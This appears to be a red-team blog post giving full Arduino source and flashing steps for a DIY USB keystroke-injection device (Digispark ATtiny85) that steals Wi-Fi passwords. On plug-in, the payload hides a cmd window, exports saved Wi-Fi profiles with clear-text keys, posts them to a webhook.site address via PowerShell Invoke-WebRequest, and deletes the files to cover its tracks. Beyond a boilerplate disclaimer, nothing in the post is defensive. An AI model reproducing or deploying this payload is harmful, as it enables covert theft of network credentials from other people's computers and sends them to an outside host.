---
title: "DIY RubberDucky Wifi Passwords Stealer"
description: "Steal Wifi passwords with a DIY RubberDucky."
date: "2021-08-02"
categories: [PoC]
tags: [windows, rubberducky, Wifi, red team, penetration testing, physical security]
pin: false
math: true
mermaid: true
image:
  path: "/assets/img/rubberducky/rubberducky.png"
  alt: "DIY RubberDucky"
---

In this post, I'll walk through how you can steal Wifi passwords with a DIY RubberDucky and send over to a webhook address. This payload will only work with internet access. You can have a local listener setup but that's totally up to you. I'll be using payload from [MTK911](https://github.com/MTK911/Attiny85/tree/master/payloads).<br>

### Webhook

Before we get into setting payload, let's head over to [https://webhook.site/](https://webhook.site/) to get a webhook address that we can use. Copy the webhook address. You will also see an email address that you can use but we won't be utilizing that in this walk thorugh.

```
https://webhook.site/35013eef-f6b1-4833-a3b0-xxxxxxxxxxxx
```

 ![DIY RubberDucky](/assets/img/wifistealer/wifi02.png)

### Payload

Github: [MTK911/Wifi-password-stealer](https://github.com/MTK911/Attiny85/blob/master/payloads/Wi-Fi%20password%20stealer/WifiKey-Grab_Minimize-of-Shame.ino)

You can try out other payloads from MTK911 as well. He posted quite a number of awesome payloads.

Fire up your Arduino IDE. Make sure Digispark drivers are installed. If you haven't done so already, please see my previous post for the setup guide.

Make sure that Boards Manager is set to `Digistump 16.5mhz` and Programmer set to `Micronucleus`.

Paste the code into the IDE:

```
/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); //going to temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
```

Your IDE should now look something like this:

![DIY RubberDucky](/assets/img/wifistealer/wifi01.png)

Be sure to paste in your unique webhook address that you obtained above. You can play around with the delay to better suit your needs. 

Press `Upload` button when ready.

![DIY RubberDucky](/assets/img/instantshell/shell02.png)

You will see the message saying: `Plug in the device now...`.

![DIY RubberDucky](/assets/img/instantshell/shell03.png)

Plug in your ATtiny85. When done, `Micronucleus done. Thank you!` message will show.

![DIY RubberDucky](/assets/img/instantshell/shell04.png)

> Always remember to unplug the Digispark before hitting upload and plug it in when the Arduino IDE requests you to. If you get an error that assertion failed or micronucleus crashed during upload then you probably did not unplug your Digispark before uploading.

Now, plug the device into a computer and wait for it to trigger.

![DIY RubberDucky](/assets/img/wifistealer/wifi03.png)

For any questions, feel free to reach out to me on twitter.

> DISCLAIMER: All the software/scripts/applications/things in this repository are provided as is, without warranty of any kind. Use of these software/scripts/applications/things is entirely at your own risk. Creator of these softwares/scripts/applications/things is not responsible for any direct or indirect damage to your own or defiantly someone else's property resulting from the use of these software/scripts/applications/things. 